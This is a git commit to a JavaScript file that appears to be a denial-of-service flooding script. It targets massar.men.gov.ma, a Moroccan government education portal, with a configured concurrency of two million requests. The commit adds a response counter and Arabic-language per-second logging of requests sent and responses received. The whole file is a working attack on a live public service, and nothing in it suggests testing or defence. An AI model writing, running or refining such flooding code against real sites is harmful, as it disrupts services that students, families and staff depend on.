c74ddd65b789791430b76154193e8e2654a41323
karimAlyamani <105087359+Kbot19@users.noreply.github.com>
2024-04-06 13:33:13 +0000

    Update massar.js

--- massar.js
+++ massar.js
@@ -4,6 +4,7 @@ async function run() {
   const url = 'https://massar.men.gov.ma';
   const concurrency = 2000000;
   let requestsCount = 0;
+  let responsesCount = 0;
 
   const requests = [];
   for (let i = 0; i < concurrency; i++) {
@@ -11,13 +12,15 @@ async function run() {
   }
 
   setInterval(() => {
-    console.log(`تم إرسال ${requestsCount} طلب في الثانية الحالية.`);
+    console.log(`تم إرسال ${requestsCount} طلب وتم استلام ${responsesCount} استجابة في الثانية الحالية.`);
     requestsCount = 0;
+    responsesCount = 0;
   }, 1000);
 
   for (const request of requests) {
     await request;
     requestsCount++;
+    responsesCount++;
   }
 }
 
